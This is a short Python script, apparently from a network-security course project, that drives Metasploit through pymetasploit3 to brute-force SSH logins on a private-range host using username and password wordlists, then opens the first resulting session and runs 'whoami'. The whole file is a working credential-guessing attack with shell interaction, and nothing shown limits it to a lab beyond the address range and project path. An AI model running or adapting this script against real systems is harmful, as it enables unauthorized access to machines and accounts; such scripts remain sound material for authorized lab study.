from pymetasploit3.msfrpc import MsfRpcClient
import time

target_ip = '192.168.56.14'
client = MsfRpcClient('1234')

# print(client.modules.auxiliary)

try:
    auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
    auxiliary['PASS_FILE'] = '/RanD/Pycharm-Community/PycharmProjects/netsec-project/modules/resources/password.lst'
    auxiliary['USER_FILE'] = '/RanD/Pycharm-Community/PycharmProjects/netsec-project/modules/resources/user.lst'
    auxiliary['RHOSTS'] = target_ip
    auxiliary['RPORT'] = 22
    # auxiliary['VERBOSE'] = True

    execute = auxiliary.execute()
    print(execute)
    
    time.sleep(600)
    
    shell = client.sessions.session(list(client.sessions.list.keys())[0])

    # Write to the shell
    shell.write('whoami')

    # Print the output

    print(shell.read())

except Exception as e:
    print(e)


